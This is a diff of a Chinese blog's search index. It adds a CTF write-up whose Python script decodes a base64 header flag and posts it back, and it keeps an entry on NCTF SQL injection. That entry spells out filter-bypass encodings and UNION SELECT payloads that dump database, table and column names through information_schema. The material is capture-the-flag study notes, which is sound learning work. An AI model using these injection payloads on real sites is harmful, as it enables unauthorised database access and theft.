@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[bugku速度要快wp]]></title>
+    <url>%2F2018%2F12%2F10%2Fbugku%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%ABwp%2F</url>
+    <content type="text"><![CDATA[http://123.206.87.240:8002/web6/这道题我首先在headers里发现flag，base64解码然后提交失败，发现是需要post得到的数据，然后试了半天都不对，结果发现需要post的是两次解码后的得到的数字。。。无语，上代码 1234567891011121314151617import reimport requestsimport base64url='http://123.206.87.240:8002/web6/'s = requests.Session()#创建session对象，保存Cookie值r = s.get(url)'''txt1 = re.search("flag': '(.*?)',",str(r.headers),re.S)txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1.group(1))),re.S)这个是我刚开始绕的弯路,基础功不扎实'''txt1=r.headers['flag']txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1)),re.S)flag=base64.b64decode(txt2.group(1))d=&#123;"margin":flag&#125;print(s.post(url,data=d).text)]]></content>
+      <categories>
+        <category>web安全学习笔记</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[nctf打卡题]]></title>
     <url>%2F2018%2F11%2F27%2Fnctf%E6%89%93%E5%8D%A1%E9%A2%98%2F</url>
     <content type="text"><![CDATA[我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。http://ctfgame.acdxvfsvd.net:20001/首先学到了空格的过滤绕过：1%20 %09 %0a %0b %0c %0d %a0 %00 /**/ () 发现过滤了截断符号%23,#,–+，只要在语句最后在加个单引号使其闭合就可以了，’’空的也可以执行，就不用用注释了。然后大佬提到’必须直接跟在select后。123?id=1'' 查询:select * from user where id='1''' LIMIT0,1 可以?id=1' and 1=1' 查询:select * from users where id='1' and 1=1'' LIMIT 0,1 不可以id=-1' union select 1,2,3' 可以 然后用子查询进行操作,select * from user where id=’-1’ union select (select group_concat(schema_name) from information_schema.schemata),2,3’，这样就行了。1234http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),2,3%27爆数据库名，应该是这个flaaaaaaag数据库。http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%27flaaaaaaag%27),2,3%27爆表名，f144444444ghttp://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=%27f144444444g%27),2,3%27爆列名，th1s_1s_flaghttp://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),2,3%27查询到flag 收获很多。]]></content>
@@ -76,8 +88,8 @@
         <category>算法竞赛学习笔记</category>
       </categories>
       <tags>
-        <tag>算法</tag>
         <tag>python</tag>
+        <tag>算法</tag>
         <tag>c</tag>
       </tags>
   </entry>
@@ -89,8 +101,8 @@
         <category>算法竞赛学习笔记</category>
       </categories>
       <tags>
-        <tag>算法</tag>
         <tag>python</tag>
+        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
